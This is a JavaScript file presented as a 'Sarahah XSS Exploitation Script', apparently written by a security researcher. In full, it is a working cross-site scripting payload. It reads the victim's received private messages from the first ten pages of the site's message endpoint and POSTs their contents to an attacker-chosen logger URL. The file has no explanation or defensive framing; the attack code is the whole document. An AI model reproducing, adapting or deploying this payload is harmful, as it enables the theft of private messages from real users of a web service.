/*
   ____                  _           _     
 / ___|  __ _ _ __ __ _| |__   __ _| |__  
 \___ \ / _` | '__/ _` | '_ \ / _` | '_ \ 
  ___) | (_| | | | (_| | | | | (_| | | | |
 |____/ \__,_|_|  \__,_|_| |_|\__,_|_| |_|
	   Sarahah XSS Exploitation Script
           Coded by Shawar Khan ( www.shawarkhan.com )
*/
// Message Capturing Exploit Code
// Params Required: username,logger

for(var i=0;i<10;i++){
var xhr = new XMLHttpRequest();
var url = 'https://'+document.domain+'/Messages/GetReceivedMessagePage?page='+i
console.log(url);
xhr.open('GET', url, true);
xhr.onload = function () {   
	var data = 'message='+this.responseText;
	if(this.responseText!='[]'){
		var xhr1 = new XMLHttpRequest();
		xhr1.open('POST',logger+'?username='+username);
		xhr1.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		xhr1.onload=function(){
			console.log(':)');
			};
		xhr1.send(data); };
	}
xhr.send();
}